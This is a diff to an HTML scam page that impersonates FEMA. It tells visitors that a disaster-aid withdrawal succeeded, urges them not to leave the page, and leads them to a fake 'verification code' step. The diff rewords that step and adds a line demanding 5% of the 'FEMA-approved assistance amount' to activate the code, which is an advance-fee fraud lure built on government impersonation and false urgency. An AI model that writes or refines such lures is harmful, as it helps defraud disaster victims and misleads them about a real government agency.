@@ -721,12 +721,12 @@ h3.fema-mobile-app-title {
 </div>
 
           
-            <h3 style="text-align: left; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">Your withdrawal of <span id="display-amount-step02"></span> was successful and is now being prepared to be transferred to your account.
+            <h3 style="text-align: left; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight: bold;">Your withdrawal of <span id="display-amount-step02"></span> was successful and is now being prepared to be transferred to your account.
             To ensure the security of your funds, please do not leave this page. Continue to the next step to verify your identity.</h3>
 
-            <h3 style="text-align: left; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">You will receive an email with the latest update within the next 10 minutes.</h3>
+            <h3 style="text-align: left; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight: bold;">You will receive an email with the latest update within the next 10 minutes.</h3>
           
-          
+              
 
 
 
@@ -750,17 +750,18 @@ h3.fema-mobile-app-title {
 
         <h2 style="color: #042b66; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">Seal Barcode</h2>
 
-        <p style="text-align: left;">Dear, <span id="display-last"></span> to verify your identity, scan the FEMA barcode seal at your nearest location.</p>
+        <p style="text-align: left;">Dear, <span id="display-last"></span> Enter the FEMA verification code</p>
 
 
 <div height="-50%">
-  <input type="tel">
+  <input type="number">
 <button id="generate-code-btn" class="button" type="button" onclick="generateBarcode()" style="margin: 20px 0;">
   Generate Barcode
 </button>
 
 <div id="barcode-container" style="display: none;">
   <img src="sites/default/files/graphics/code-for-fema.jpg" alt="" width="50" height="50" style="border: 1px solid black; width: 50%;" />
+  <br>The code was successfully verified. To activate it, you must scan it with 5% of the FEMA-approved assistance amount. Once activated, The funds are reflected in your account.
   <br> Code Expire in:</br>
 </div>
 
